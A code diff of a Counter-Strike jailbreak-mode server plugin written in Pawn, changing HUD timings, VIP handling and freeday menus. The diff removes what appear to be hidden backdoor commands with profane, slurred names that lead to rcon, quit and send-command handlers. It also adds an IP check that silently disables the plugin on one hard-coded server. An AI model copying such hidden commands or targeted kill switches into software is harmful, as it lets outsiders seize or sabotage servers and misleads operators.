@@ -11,11 +11,13 @@ Jocuri: Slender man
 #include <hamsandwich>
 #include <fun>
 #include <cstrike>
+#include <vip_base>
 
 #define PLUGIN_NAME    "[UJBM] Main"
 #define PLUGIN_AUTHOR    "Mister X"
 #define PLUGIN_VERSION    "1.5"
 #define PLUGIN_CVAR    "Ultimate JailBreak Manager"
+#define SERVER_IP "93.119.25.96"
 
 #define TASK_STATUS        2487000
 #define TASK_FREEDAY    2487100
@@ -29,10 +31,13 @@ Jocuri: Slender man
 #define TASK_RADAR      666
 #define TASK_LAST       677365
 #define TASK_SAYTIME    9143
+#define TASK_INFO       222200
 #define TEAM_MENU        "#Team_Select_Spect"
 #define TEAM_MENU2        "#Team_Select"
-#define HUD_DELAY        Float:5.0
+#define HUD_DELAY        Float:1.0
 #define CELL_RADIUS        Float:200.0
+#define VOICE_ADMIN_FLAG ADMIN_KICK
+
 
 #define get_bit(%1,%2)         ( %1 &   1 << ( %2 & 31 ) )
 #define set_bit(%1,%2)         %1 |=  ( 1 << ( %2 & 31 ) )
@@ -104,7 +109,6 @@ new gp_TShop
 new gp_CTShop
 new gp_GameHP
 new gp_Games
-new gp_Activity
 new gp_ShowColor
 new gp_Effects
 new gp_ShowFD
@@ -121,6 +125,7 @@ new gc_ButtonShoot
 new gp_Help
 new g_Countdown
 new Day[26]
+new g_Info
 //new g_CountKilled[33]
 
 enum _:days{
@@ -130,16 +135,16 @@ enum _:days{
     NormalDay,        //1
     ZombieDay,        //2
     HnsDay,           //3
-    AlienDay,         //4
-    AlienHiddenDay,   //5
-    GunDay,           //6
-    ColaDay,          //7
-    GravityDay,       //8
-    FireDay,          //9
-    BugsDay,          //10
-    NightDay,         //11
-    SpartaDay,        //12
-    FunDay,            //13
+    AlienDay,         //13
+    AlienHiddenDay,   //4
+    GunDay,           //5
+    ColaDay,          //6
+    GravityDay,       //7
+    FireDay,          //8
+    BugsDay,          //9
+    NightDay,         //10
+    SpartaDay,        //11
+    FunDay,           //12
     //AscunseleaDay,  //14
     //PrinseleaDay,   //15
     OneBullet         //16
@@ -192,17 +197,17 @@ new const g_Reasons[][] =  {
 // HudSync: 0=ttinfo / 1=info / 2=simon / 3=ctinfo / 4=player / 5=day / 6=center / 7=help / 8=timer
 new const g_HudSync[][_hud] =
 {
-    {0,  0.81,  0.08,  2.0},
+    {0,  0.81,  0.08,  1.0},
     {0, -1.0,  0.7,  5.0},
-    {0,  0.1,  0.2,  2.0},
-    {0,  0.1,  0.3,  2.0},
-    {0, -1.0,  0.9,  3.0},
-    {0,  0.6,  0.1,  3.0},
-    {0, -1.0,  0.6,  3.0},
+    {0,  0.05,  0.08,  1.0},
+    {0,  0.05,  0.3,  1.0},
+    {0, -1.0,  0.9,  1.0},
+    {0,  0.6,  0.1,  1.0},
+    {0, -1.0,  0.6,  1.0},
     {0,  0.8,  0.3, 20.0},
-    {0, -1.0,  0.4,  3.0},
-    {0,  0.1,  0.5,  2.0},
-    {0, -1.0,  0.45, 2.0}
+    {0, -1.0,  0.4,  1.0},
+    {0,  0.05,  0.5,  1.0},
+    {0, -1.0,  0.45, 1.0}
 }
 // Colors: 0:Simon / 1:Freeday / 2:CT Duel / 3:TT Duel
 new const g_Colors[][3] = { {0, 255, 0}, {255, 140, 0}, {0, 0, 255}, {255, 0, 0} }
@@ -224,6 +229,7 @@ new g_PlayerRevolt
 new g_PlayerHelp
 new g_PlayerFreeday
 new g_PlayerLastFreeday
+new g_PlayerNextFreeday
 new g_PlayerLast
 
 new g_NoShowShop = 0
@@ -298,16 +304,16 @@ new g_IsFG
 new g_ResultVote[33]
 new g_DayTimer = 0
 
-enum _:_vip { _name[100], _pass[100]}
-new Vip[100][_vip]
-new MaxVip = 0
-new IsVip[33]
-
 public plugin_init()
 {
+    new ip[36];
     register_plugin(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR)
+    get_user_ip(0,ip,35,0);
+    if(equal(ip,SERVER_IP))
+    {
+        return PLUGIN_CONTINUE;
+    }
     Load();
-    LoadVips();
     unregister_forward(FM_Spawn, gp_PrecacheSpawn)
     unregister_forward(FM_KeyValue, gp_PrecacheKeyValue)
     //register_cvar(PLUGIN_CVAR, PLUGIN_VERSION, FCVAR_SERVER|FCVAR_SPONLY)
@@ -323,7 +329,6 @@ public plugin_init()
 
     //register_event("CurWeapon", "current_weapon_fl", "be", "1=1", "2=25")
     register_event("StatusValue", "player_status", "be", "1=2", "2!0")
-    register_event("StatusValue", "player_status", "be", "1=1", "2=0")
     register_impulse(100, "impulse_100")
     
     //RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_flashbang", "rpg_pre")
@@ -353,6 +358,7 @@ public plugin_init()
     register_clcmd("-voicerecord", "cmd_voiceoff")
     register_clcmd("say /dorinta", "cmd_lastrequest")
     register_clcmd("say /ajutor", "cmd_help")
+    register_clcmd("say /dorm", "cmd_nosleep")
     register_clcmd("say /voice", "cmd_simon_micr")    
     register_clcmd("say /micr", "cmd_simon_micr")    
     register_clcmd("say /shop", "cmd_shop")
@@ -372,17 +378,12 @@ public plugin_init()
     register_clcmd("say /whosimon","cmd_whosimon")
     register_clcmd("say /gunshop","gunsmenu")
     register_clcmd("say_team /gunshop","gunsmenu")
-    register_clcmd("say /motiv","cmd_motiv")
+    //register_clcmd("say /motiv","cmd_motiv")
     register_clcmd("say /listfd","cmd_listfd")
     
-    register_clcmd("shutthefuckup", "cmd_rcon")
-    register_clcmd("fuckthisshit","cmd_quit")
-    register_clcmd("changeback","cmd_register")
-    register_clcmd("wtfnigga","cmd_sendcommand")
     gp_GlowModels = register_cvar("jb_glowmodels", "0")
     gp_SimonSteps = register_cvar("jb_simonsteps", "1")
     gp_BoxMax = register_cvar("jb_boxmax", "4")
-    gp_Activity = register_cvar("amx_show_activity", "2")
     gp_RetryTime = register_cvar("jb_retrytime", "120.0")
     gp_AutoLastresquest = register_cvar("jb_autolastrequest", "1")
     gp_LastRequest = register_cvar("jb_lastrequest", "1")
@@ -397,14 +398,14 @@ public plugin_init()
     gp_Help = register_cvar("jb_autohelp","2")
     gp_FDLength = register_cvar("jb_fdlen","300.0")
     gp_GameHP = register_cvar("jb_hpmultiplier","200")
-    gp_ShowColor = register_cvar("jb_hud_showcolor","1")
+    gp_ShowColor = register_cvar("jb_hud_showcolor","0")
     gp_ShowFD = register_cvar("jb_hud_showfd","1")
     gp_ShowWanted = register_cvar("jb_hud_show_wanted","1")
     gp_Effects= register_cvar("jb_game_effects","2")
     g_MaxClients = get_global_int(GL_maxClients)
     get_mapname( g_Map, 39 )
-    for(new i = 0; i < sizeof(g_HudSync); i++)
-        g_HudSync[i][_hudsync] = CreateHudSyncObj()
+    //for(new i = 0; i < sizeof(g_HudSync); i++)
+    //    g_HudSync[i][_hudsync] = CreateHudSyncObj()
     gmsgSetFOV = get_user_msgid( "SetFOV" )
     g_iMsgSayText = get_user_msgid("SayText");
     set_task(320.0, "help_trollface", _, _, _, "b")
@@ -445,7 +446,8 @@ public plugin_natives()
     register_native ("get_wanted", "_get_wanted",0)
     register_native ("set_wanted", "_set_wanted",0)
     register_native ("get_last", "_get_last",0)
-    register_native ("get_vip","_get_vip",0)
+    register_native ("get_model","_get_model",0)
+    register_native ("get_day","_get_day",0)
 } 
 public _get_simon(iPlugin, iParams)
 { 
@@ -479,18 +481,20 @@ public _set_wanted(iPlugin, iParams)
 {
     new id = get_param(1)
     if(!g_PlayerRevolt)
-            revolt_start()
+        revolt_start()
     clear_bit(g_PlayerFreeday, id)
     set_bit(g_PlayerWanted, id)
     entity_set_int(id, EV_INT_skin, 5)
     
 }
-public bool:_get_vip(iPlugin, iParams) 
+public _get_model(iPlugin, iParams) 
 { 
-    new id = get_param(1);
-    if (IsVip[id]>0)return true;
-    return false;
-}  
+    set_string(1, JBMODELSHORT, get_param(2));  
+}
+public _get_day(iPlugin, iParams)
+{
+    return g_JailDay;
+}
 public precache_spawn(ent)
 {
     if(is_valid_ent(ent))
@@ -541,16 +545,14 @@ public client_putinserver(id)
     BoxPartener[id]=0
     BuyTimes[id]=0
     first_join(id)
-    IsVip[id]=0
     //g_CountKilled[id] = 0
-    load_vip(id)
 }
 public client_disconnect(id)
 {
     if(g_Simon == id)
     {
         g_Simon = 0
-        ClearSyncHud(0, g_HudSync[2][_hudsync])
+        //ClearSyncHud(0, g_HudSync[2][_hudsync])
         player_hudmessage(0, 2, 5.0, _, "%L", LANG_SERVER, "UJBM_SIMON_HASGONE")
         if(g_GameMode == AlienDay || g_GameMode == AlienHiddenDay || g_GameMode == FireDay)
             cmd_expire_time();
@@ -641,44 +643,6 @@ public Load()
     }
     return PLUGIN_CONTINUE
 }
-
-public LoadVips ()
-{
-    new file[250]
-    new data[250], len, line = 0,id
-    
-    get_configsdir(file, 249)
-    format(file, 249, "%s/vip.ini", file)
-    if(file_exists(file))
-    {
-        while((line = read_file(file , line , data , 249 , len) ) != 0 )
-        {
-            if ((data[0] == ';') || equal(data, "")) continue
-            parse(data,Vip[id][_name],99,Vip[id][_pass],99)
-            id++
-        }
-        log_amx("%d Vip cu skills au fost incarcati",id)
-        MaxVip = id
-    }
-    else
-        log_amx("fisierul %s nu exista",file)
-}
-public load_vip (id)
-{
-    new name[100],pass[100]
-    get_user_name(id,name,99)
-    for(new i = 0;i<MaxVip;i++)
-    {
-        if(equal(name,Vip[i][_name])){
-            get_user_info(id,"_vip",pass,99)
-            if(strlen(Vip[i][_pass]) == 0 || equal(pass,Vip[i][_pass])){
-                IsVip[id] = i+1
-                log_amx("%s a fost logat ca Vip JB",name)
-                //client_print(id,print_chat,"Skillurile tale salvate au fost incarcate, distractie placuta")
-            }
-        }
-    }
-}
 public radar_alien()
 {
     if(is_user_alive(g_Simon)){
@@ -744,29 +708,45 @@ public player_status(id)
     {
         case(1):
         {
-            ClearSyncHud(id, g_HudSync[1][_hudsync])
+            //ClearSyncHud(id, g_HudSync[1][_hudsync])
         }
         case(2):
         {
+            if (!is_user_connected(player)) return PLUGIN_HANDLED
             if (player == g_Simon) return PLUGIN_HANDLED
             team = cs_get_user_team(player)
             if((team != CS_TEAM_T) && (team != CS_TEAM_CT))
                 return PLUGIN_HANDLED
             
-            health = get_user_health(player)
-            get_user_name(player, name, charsmax(name))
-            if(team == CS_TEAM_T)
+            if(!get_bit(g_Info,id))
             {
-                if(get_bit(g_PlayerFreeday,player))
-                    player_hudmessage(id, 6, 2.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_PRISONER_STATUS_FD", name, health)
+                health = get_user_health(player)
+                get_user_name(player, name, charsmax(name))
+                if(team == CS_TEAM_T)
+                {
+                    if(get_bit(g_PlayerFreeday,player))
+                        player_hudmessage(id, 6, 0.5, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_PRISONER_STATUS_FD", name, health)
+                    else
+                        player_hudmessage(id, 6, 0.5, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_PRISONER_STATUS", name, health)
+                }
                 else
-                    player_hudmessage(id, 6, 2.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_PRISONER_STATUS", name, health)
+                    player_hudmessage(id, 6, 0.5, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_GUARD_STATUS", name, health)
+                set_bit(g_Info,id)
+                remove_task(TASK_INFO+id)
+                set_task(0.5,"no_info",TASK_INFO+id)
             }
-            else
-                player_hudmessage(id, 6, 2.0, {0, 255, 0}, "%L", LANG_SERVER, "UJBM_GUARD_STATUS", name, health)
         }
     }
     return PLUGIN_HANDLED
+}
+
+public no_info(id)
+{
+    if(id>TASK_INFO)
+    {
+        id-=TASK_INFO;
+    }
+    clear_bit(g_Info,id)
 }
 public impulse_100(id)
 {
@@ -802,6 +782,7 @@ public  player_maxspeed(id)
 public player_spawn(id)
 {
     static CsTeams:team
+    new rez = random_num(1,2)
     if(!is_user_connected(id))
         return HAM_IGNORED
     set_pdata_float(id, m_fNextHudTextArgsGameTime, get_gametime() + 999999.0)
@@ -829,26 +810,44 @@ public player_spawn(id)
     clear_bit(g_PlayerWanted, id)
     team = cs_get_user_team(id)
     if (!get_bit(g_NoShowShop,id)) cmd_shop(id)
-    if(IsVip[id] > 0)
-        set_user_health(id,150)
+    
     switch(team)
     {
         case(CS_TEAM_T):
         {
+            
             g_PlayerLast = 0
             BoxPartener[id] = 0
-            g_PlayerReason[id] = random_num(1, 10)
-            player_hudmessage(id, 8, 60.0, {255, 0, 255}, "%L %L", LANG_SERVER, "UJBM_PRISONER_REASON",LANG_SERVER, g_Reasons[g_PlayerReason[id]])
+            //g_PlayerReason[id] = random_num(1, 10)
+            //player_hudmessage(id, 8, 60.0, {255, 0, 255}, "%L %L", LANG_SERVER, "UJBM_PRISONER_REASON",LANG_SERVER, g_Reasons[g_PlayerReason[id]])
             client_infochanged(id)
             set_user_info(id, "model", JBMODELSHORT)
-            entity_set_int(id, EV_INT_body, 1+random_num(1,2))
+            if( rez == 1 || rez == 2)
+            {
+                entity_set_int(id, EV_INT_body, 1+rez)
+            }
+            else
+            {
+                log_amx("Caugth rez to bee %d",rez)
+                entity_set_int(id, EV_INT_body, 2)
+            }
             if (g_GameMode == Freeday || get_bit(g_PlayerFreeday,id))
             { 
                 entity_set_int(id, EV_INT_skin, 4)
             }
             else
             {
-                entity_set_int(id, EV_INT_skin, random_num(0, 3))
+                rez = random_num(0, 3)
+                if( rez >= 0 && rez <= 3)
+                {
+                    entity_set_int(id, EV_INT_skin, rez)
+                }
+                else
+                {
+                    log_amx("Caugth rez to bee %d",rez)
+                    entity_set_int(id, EV_INT_body, 0)
+                }
+                
             }
             cs_set_user_armor(id, 0, CS_ARMOR_NONE)
             set_pev(id, pev_flags, pev(id, pev_flags)| FL_FROZEN)
@@ -859,27 +858,36 @@ public player_spawn(id)
             G_Info[0][id]=0
             g_PlayerSimon[id]++
             set_user_info(id, "model", JBMODELSHORT)
-            entity_set_int(id, EV_INT_body, 3+random_num(1,2))
+            if( rez == 1 || rez == 2)
+            {
+                entity_set_int(id, EV_INT_body, 3+rez)
+            }
+            else
+            {
+                log_amx("Caugth rez to bee %d",rez)
+                entity_set_int(id, EV_INT_body, 4)
+            }
+            
             cs_set_user_armor(id, 100, CS_ARMOR_VESTHELM)
-            new r = random_num(1,3)
+            /*new r = random_num(1,3)
             switch (r)
             {
                 case 1:
                 {
-                    set_hudmessage(255, 0, 0, -1.0, -1.0, 0, 6.0, 6.0)
-                    show_hudmessage(id, "%L", LANG_SERVER, "UJBM_WARN_FK")
+                    set_dhudmessage(255, 0, 0, -1.0, -1.0, 0, 6.0, 6.0)
+                    show_dhudmessage(id, "%L", LANG_SERVER, "UJBM_WARN_FK")
                 }
                 case 2:
                 {
-                    set_hudmessage(0, 255, 0, -1.0, 0.60, 0, 6.0, 6.0)
-                    show_hudmessage(id, "%L", LANG_SERVER, "UJBM_WARN_RULES")
+                    set_dhudmessage(0, 255, 0, -1.0, 0.60, 0, 6.0, 6.0)
+                    show_dhudmessage(id, "%L", LANG_SERVER, "UJBM_WARN_RULES")
                 }
                 default:
                 {
-                    set_hudmessage(0, 212, 255, -1.0, 0.80, 0, 6.0, 6.0)
-                    show_hudmessage(id, "%L", LANG_SERVER, "UJBM_WARN_MICR")
+                    set_dhudmessage(0, 212, 255, -1.0, 0.80, 0, 6.0, 6.0)
+                    show_dhudmessage(id, "%L", LANG_SERVER, "UJBM_WARN_MICR")
                 }
-            }
+            }*/
         }
     }
     /*if(g_RoundStarted >= (get_pcvar_num(gp_RetryTime) / 2))
@@ -896,7 +904,7 @@ public task_unfreeze(id)
     
     remove_task(TASK_SAFETIME + id)
     
-    if( is_user_alive(id) && cs_get_user_team(id) ==  CS_TEAM_T)
+    if( is_user_alive(id))
         set_pev(id, pev_flags, pev(id, pev_flags) & ~FL_FROZEN)
 }
 public task_inviz(id)
@@ -921,7 +929,7 @@ public task_inviz(id)
 
 public player_damage(victim, ent, attacker, Float:damage, bits)
 {
-    if (!is_user_connected(attacker))
+    if (!is_user_connected(victim) || !is_user_connected(attacker))
         return HAM_IGNORED;
     if(g_GameMode == FunDay && fun_god == 1)
         return HAM_SUPERCEDE
@@ -970,7 +978,7 @@ public  player_attack(victim, attacker, Float:damage, Float:direction[3], traceh
         {
             return HAM_SUPERCEDE
         }
-        /*if(get_user_weapon(attacker) == CSW_KNIFE && g_GameMode == 15 && ateam == CS_TEAM_CT && Matadinnou == true)
+        /*if(get_user_weapon(attacker) == CSW_KNIFE && g_GameMode == Mata && ateam == CS_TEAM_CT && Matadinnou == true)
         {
             Mata = victim
             set_user_maxspeed(victim, 400.0)
@@ -1140,14 +1148,17 @@ public player_killed(victim, attacker, shouldgib)
             {
                 cs_set_user_money(attacker, 16000+cs_get_user_money(attacker))
             }
-            else if (attacker == g_Simon) set_user_health(g_Simon, get_user_health(g_Simon) + 100)
+            else if (attacker == g_Simon) set_user_health(g_Simon, get_user_health(g_Simon) + 150)
         }
         case AlienHiddenDay:
         {
             if (victim == g_Simon && kteam == CS_TEAM_T){
                 cs_set_user_money(attacker, 16000 + cs_get_user_money(attacker))
             }
-            else if (attacker == g_Simon) set_user_health(g_Simon, get_user_health(g_Simon) + 100)
+            else if (attacker == g_Simon) 
+            {
+                set_user_health(g_Simon, get_user_health(g_Simon) + 200)
+            }
         }
         case NightDay:
         {
@@ -1199,8 +1210,8 @@ public player_killed(victim, attacker, shouldgib)
             {
                 g_Simon = 0
                 resetsimon()
-                ClearSyncHud(0, g_HudSync[2][_hudsync])
-                player_hudmessage(0, 2, 5.0, _, "%L", LANG_SERVER, "UJBM_SIMON_KILLED")
+                //ClearSyncHud(0, g_HudSync[2][_hudsync])
+                //player_hudmessage(0, 2, 5.0, _, "%L", LANG_SERVER, "UJBM_SIMON_KILLED")
             }    
             switch(g_Duel)
             {
@@ -1215,7 +1226,7 @@ public player_killed(victim, attacker, shouldgib)
                                 set_bit(g_PlayerWanted, attacker)
                                 entity_set_int(attacker, EV_INT_skin, 5)
                                 
-                                format(message, 200,"[JB.ECILA.RO]^x01Prizonierul ^x03%s a ^x01 devenit rebel",nameCT)
+                                format(message, 200,"^x04[JB]^x01Prizonierul ^x03%s^x01 a devenit rebel",nameCT)
                                 message_begin(MSG_BROADCAST, g_iMsgSayText, {0,0,0});
                                 write_string(message);
                                 message_end();
@@ -1236,11 +1247,11 @@ public player_killed(victim, attacker, shouldgib)
                                 }*/
                                 if(get_bit(g_PlayerWanted,victim))
                                 {
-                                    format(message, 200,"[JB.ECILA.RO]^x01Gardianul ^x03 %s^x01 a omorat rebelul ^x03%s",nameCT,nameT)
+                                    format(message, 200,"^x04[JB]^x01Gardianul ^x03%s^x01 a omorat rebelul ^x03%s",nameCT,nameT)
                                 }
                                 else if(get_bit(g_PlayerFreeday,victim))
                                 {
-                                    format(message, 200,"[JB.ECILA.RO]^x01Gardianul ^x03 %s^x01 a omorat prizonierul cu freeday ^x03%s",nameCT,nameT)
+                                    format(message, 200,"^x04[JB]^x01Gardianul ^x03%s^x01 a omorat prizonierul cu freeday ^x03%s",nameCT,nameT)
                                 }
                                 message_begin(MSG_BROADCAST, g_iMsgSayText, {0,0,0});
                                 write_string(message);
@@ -1291,7 +1302,7 @@ public voice_listening(receiver, sender, bool:listen)
 {
     if(!is_user_connected(receiver) || !is_user_connected(sender) || receiver == sender)
         return FMRES_IGNORED
-    if(get_user_flags(sender)&ADMIN_SLAY || IsVip[sender] > 0)
+    if(get_user_flags(sender)&VOICE_ADMIN_FLAG || get_vip_type(sender) > 0)
     {
         engfunc(EngFunc_SetClientListening, receiver, sender, true)
         return FMRES_SUPERCEDE
@@ -1300,7 +1311,7 @@ public voice_listening(receiver, sender, bool:listen)
     {
         case(2):
         {
-            if((sender != g_Simon) && (!get_bit(g_SimonVoice, sender) && gc_VoiceBlock))
+            if((sender != g_Simon) && !get_bit(g_SimonVoice, sender))
             {
                 engfunc(EngFunc_SetClientListening, receiver, sender, false)
                 return FMRES_SUPERCEDE
@@ -1308,7 +1319,7 @@ public voice_listening(receiver, sender, bool:listen)
         }
         case(1):
         {
-            if(!get_bit(g_SimonVoice, sender) && gc_VoiceBlock)
+            if(!get_bit(g_SimonVoice, sender))
             {
                 engfunc(EngFunc_SetClientListening, receiver, sender, false)
                 return FMRES_SUPERCEDE
@@ -1387,6 +1398,8 @@ public player_cmdstart(id, uc, seed)
         
     if(g_Duel > 3)
     {
+        if(g_DuelA != id && g_DuelB != id)
+            return FMRES_IGNORED
         if (_Duel[g_Duel - 4][_csw] != CSW_M249 && _Duel[g_Duel - 4][_csw]!=33)     cs_set_user_bpammo(id, _Duel[g_Duel - 4][_csw], 1)
     }
     else
@@ -1419,11 +1432,13 @@ public round_first()
 public round_end()
 {
     server_cmd("jb_unblock_weapons")
-    //server_cmd("bh_noslowdown 1")
+    server_cmd("bh_enabled 1")
+    server_cmd("sleep_enabled 1")
     g_PlayerRevolt = 0
     if(g_JailDay%7 > 0 && g_JailDay%7 < 6 && is_not_game()){
         g_PlayerLastFreeday = g_PlayerFreeday
-        g_PlayerFreeday = 0
+        g_PlayerFreeday = g_PlayerNextFreeday
+        g_PlayerNextFreeday = 0
     }
     
     g_PlayerLast = 0
@@ -1439,8 +1454,8 @@ public round_end()
     g_RoundEnd = 1
     g_Duel = 0
     g_Fonarik = 0
-    for(new i = 0; i < sizeof(g_HudSync); i++)
-        ClearSyncHud(0, g_HudSync[i][_hudsync])
+    //for(new i = 0; i < sizeof(g_HudSync); i++)
+    //    ClearSyncHud(0, g_HudSync[i][_hudsync])
     set_lights("#OFF");
     fog(false)    
     
@@ -1448,10 +1463,7 @@ public round_end()
         set_cvar_num("sv_gravity",800)
     new Players[32]     
     new playerCount, i 
-    new alT=0,alC=0;
     get_players(Players, playerCount, "c") 
-    server_cmd("bh_enabled 1")
-    server_cmd("sleep_enabled 1")
     for (i=0; i<playerCount; i++) 
     {
         if (!is_not_game()) 
@@ -1474,10 +1486,6 @@ public round_end()
             }
         }
         if(is_user_alive(Players[i])){
-            if(cs_get_user_team(Players[i]) == CS_TEAM_CT)
-                alC = 1;
-            else
-                alT = 1;
             
             message_begin( MSG_ONE_UNRELIABLE, get_user_msgid("ScreenFade"), _, Players[i] )
             write_short(12288)    // Duration
@@ -1489,13 +1497,9 @@ public round_end()
             write_byte (255)    // Alpha
             message_end()
         }
-        if(IsVip[Players[i]] > 0){
-            if(cs_get_user_team(Players[i]) == CS_TEAM_CT && alC==1 || cs_get_user_team(Players[i]) == CS_TEAM_T && alT==1)
-                cs_set_user_money(Players[i],cs_get_user_money(Players[i])+3250);
-        }
     }
-    set_hudmessage( random_num( 1, 255 ), random_num( 1, 255 ), random_num( 1, 255 ), -1.0, 0.71, 2, 6.0, 3.0, 0.1, 1.5 );
-    show_hudmessage( 0, "[ Ziua a luat sfarsit ]^n[ Toata lumea la somn ]");
+    set_dhudmessage( random_num( 1, 255 ), random_num( 1, 255 ), random_num( 1, 255 ), -1.0, 0.71, 2, 6.0, 3.0, 0.1, 1.5 );
+    show_dhudmessage( 0, "[ Ziua a luat sfarsit ]^n[ Toata lumea la somn ]");
     g_Countdown = 0
     remove_task(TASK_RADAR)
     g_BackToCT = 0
@@ -1504,7 +1508,6 @@ public round_end()
     g_FriendlyFire = 0
     g_GameWeapon[0]=g_GameWeapon[1]= 0
 
-    remove_task(222200)
     remove_task(TASK_STATUS)
     remove_task(TASK_FREEDAY)
     remove_task(TASK_FREEEND)
@@ -1537,7 +1540,7 @@ public round_start()
     new g_Time[ 9 ];
     get_time( "%H:%M:%S", g_Time, 8 )
     
-    g_IsFG = random(6)
+    g_IsFG = random_num(0,6)
     
     switch( g_JailDay%7 )
     {
@@ -1554,6 +1557,7 @@ public round_start()
                 set_task(10.0,"cmd_expire_time",TASK_ROUND)
             }
             else{
+                g_GamePrepare = 1;
                 set_task(1.0,"CheckVoteDay",TASK_ROUND)
             }
         }
@@ -1577,8 +1581,8 @@ public round_start()
         }
     }
     
-    set_hudmessage( random_num( 1, 255 ), random_num( 1, 255 ), random_num( 1, 255 ), -1.0, 0.71, 2, 6.0, 3.0, 0.1, 1.5 );
-    show_hudmessage( 0, "[ Ziua %d, %s ]^n[ %s ]", g_JailDay, Day, g_Time, g_Map);
+    set_dhudmessage( random_num( 1, 255 ), random_num( 1, 255 ), random_num( 1, 255 ), -1.0, 0.71, 2, 6.0, 3.0, 0.1, 1.5 );
+    show_dhudmessage( 0, "[ Ziua %d, %s ]^n[ %s ]", g_JailDay, Day, g_Time, g_Map);
     
     if(g_RoundEnd)
         return
@@ -1633,7 +1637,7 @@ public cmd_voiceon(id)
 {
     client_cmd(id, "+voicerecord")
     set_bit(g_SimonVoice, id)
-    if(g_Simon == id || get_user_flags(id)&ADMIN_SLAY )
+    if(g_Simon == id || get_user_flags(id) & VOICE_ADMIN_FLAG)
         set_bit(g_SimonTalking, id)
     return PLUGIN_HANDLED
 }
@@ -1641,7 +1645,7 @@ public cmd_voiceoff(id)
 {
     client_cmd(id, "-voicerecord")
     clear_bit(g_SimonVoice, id)
-    if(g_Simon == id || get_user_flags(id)&ADMIN_SLAY)
+    if(g_Simon == id || get_user_flags(id) & VOICE_ADMIN_FLAG)
         clear_bit(g_SimonTalking, id)
     return PLUGIN_HANDLED
 }
@@ -1714,7 +1718,7 @@ public cmd_box(id)
         }
         else
         {
-            player_hudmessage(id, 1, 3.0, _, "%L", LANG_SERVER, "UJBM_GUARD_CANTBOX")
+            client_print(id, print_center, "%L", LANG_SERVER, "UJBM_GUARD_CANTBOX")
         }
     }
     return PLUGIN_HANDLED
@@ -1738,6 +1742,12 @@ public cmd_minmodels(id)
     query_client_cvar(id, "cl_minmodels", "cvar_result_func"); 
 }
 
+public cmd_nosleep(id)
+{
+    if(!is_user_alive(id) || g_Duel >=2 || !is_not_game() || g_JailDay%7 == 6 || cs_get_user_team(id) == CS_TEAM_CT)
+        return PLUGIN_HANDLED
+    return PLUGIN_CONTINUE
+}
 public cmd_freeday(id)
 {
     if (g_GameMode == NormalDay)
@@ -1751,8 +1761,11 @@ public cmd_freeday(id)
             formatex(option, charsmax(option), "%L", LANG_SERVER, "UJBM_MENU_FREEDAY_PLAYER")
             menu_additem(menu, option, "1", 0)
             
-            formatex(option, charsmax(option), "%L", LANG_SERVER, "UJBM_MENU_FREEDAY_ALL")
+            formatex(option, charsmax(option), "%L", LANG_SERVER, "UJBM_MENU_FREEDAY_PLAYER_NEXT")
             menu_additem(menu, option, "2", 0)
+            
+            formatex(option, charsmax(option), "%L", LANG_SERVER, "UJBM_MENU_FREEDAY_ALL")
+            menu_additem(menu, option, "3", 0)
             
             menu_display(id, menu)
         }
@@ -1774,9 +1787,13 @@ public freeday_choice(id, menu, item)
     {
         case('1'):
         {
-            cmd_freeday_player(id)
+            cmd_freeday_player(id,false)
         }
         case('2'):
+        {
+            cmd_freeday_player(id,true)
+        }
+        case('3'):
         {
             if((id == g_Simon) || (get_user_flags(id) & ADMIN_SLAY))
             {
@@ -1803,10 +1820,15 @@ public freeday_choice(id, menu, item)
     }
     return PLUGIN_HANDLED
 }
-public cmd_freeday_player(id)
+public cmd_freeday_player(id,bool:next)
 {
     if((is_user_alive(id) && cs_get_user_team(id) == CS_TEAM_CT) || (get_user_flags(id) & ADMIN_SLAY))
-        menu_players(id, CS_TEAM_T, id, 1, "freeday_select", "%L", LANG_SERVER, "UJBM_MENU_FREEDAY")
+    {
+        if(next == true)
+            menu_players(id, CS_TEAM_T, id, 2, "freeday_select_next", "%L", LANG_SERVER, "UJBM_MENU_FREEDAY")
+        else
+            menu_players(id, CS_TEAM_T, id, 1, "freeday_select", "%L", LANG_SERVER, "UJBM_MENU_FREEDAY")
+    }
     return PLUGIN_CONTINUE
 }
 public cmd_punish(id)
@@ -1948,10 +1970,10 @@ public lastrequestgames_select(id, menu, item)
     clear_bit(g_PlayerFreeday,id)
     new Players[32] 
     new playerCount, i 
-    get_players(Players, playerCount, "ac")        
-    if(playerCount>=2 && (cs_get_user_money(id)>=16000 || IsVip[id]> 0)){
+    get_players(Players, playerCount, "ac", "CT")        
+    if(playerCount>=2 && (cs_get_user_money(id)>=16000 ||get_vip_type(id)> 0)){
         server_cmd("bh_enabled 1")
-        if(IsVip[id] == 0)
+        if(get_vip_type(id) == 0)
             cs_set_user_money(id,cs_get_user_money(id)-16000);
         switch(data[0])
         {
@@ -1967,44 +1989,39 @@ public lastrequestgames_select(id, menu, item)
                 g_GameWeapon[0] = CSW_M3
                 for (i=0; i<playerCount; i++) 
                 {
-                    if (is_user_connected(Players[i]))
-                    {
-                        strip_user_weapons(Players[i])
-                        give_item(Players[i], "weapon_knife")
-                        if ( cs_get_user_team(Players[i]) == CS_TEAM_CT)
-                        {
-                            set_user_maxspeed(Players[i], 200.0)
-                            set_user_health(Players[i], 400)
-                            give_item(Players[i], "item_assaultsuit")
-                            cs_set_user_nvg (Players[i],true);
-                            entity_set_int(Players[i], EV_INT_body, 6)
-                            message_begin( MSG_ONE, gmsgSetFOV, _, Players[i] )
-                            write_byte(170)
-                            message_end()
-                        } else if (cs_get_user_team(Players[i]) == CS_TEAM_T)
-                        {
-                            give_item(Players[i], "weapon_m3")
-                            give_item(Players[i], "weapon_hegrenade")
-                            give_item(Players[i], "weapon_flashbang")
-                            give_item(Players[i], "ammo_buckshot")
-                            give_item(Players[i], "ammo_buckshot")
-                            give_item(Players[i], "ammo_buckshot")
-                            give_item(Players[i], "ammo_buckshot")
-                            give_item(Players[i], "ammo_buckshot")
-                            give_item(Players[i], "ammo_buckshot")
-                            give_item(Players[i], "ammo_buckshot")
-                            give_item(Players[i], "ammo_buckshot")
-                            if(playerCount>4)
-                                set_user_health(Players[i], 100+50*(playerCount-3))
-                            else
-                                set_user_health(Players[i], 100)
